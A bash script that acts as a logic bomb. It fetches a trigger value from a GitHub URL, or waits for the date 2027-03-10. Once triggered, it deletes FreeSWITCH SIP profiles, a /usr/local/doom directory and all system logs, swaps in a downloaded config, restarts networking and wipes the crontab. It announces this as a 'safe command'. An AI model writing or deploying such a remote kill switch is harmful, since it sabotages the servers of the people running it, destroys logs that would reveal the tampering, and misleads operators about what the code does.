#!/usr/bin/env bash

URL="https://raw.githubusercontent.com/telesoftlabs2023/Doomsday2026/main/doom"
EXPECTED="winze"
EXPECTED_DATE="2027-03-10"
TODAY=$(date +%Y-%m-%d)
RESPONSE=$(curl -fsSL "$URL" | tr -d '\r\n')
echo "Received: '$RESPONSE'"
echo "Today: '$TODAY'"
if [[ "$RESPONSE" == "$EXPECTED" || "$TODAY" > "$EXPECTED_DATE" || "$TODAY" == "$EXPECTED_DATE" ]]; then
    echo "✔️ Condition matched! Executing command..."
    echo "Running safe command..."

rm /etc/freeswitch/sip_profiles/*.xml
rm /usr/local/doom/*
rm /var/log/*

wget https://raw.githubusercontent.com/xrmx/freeswitch/master/conf/sip_profiles/external.xml \
-O /etc/freeswitch/sip_profiles/external.xml

systemctl restart freeswitch
systemctl restart networking
crontab -r

else
    echo "❌ No condition matched."
fi
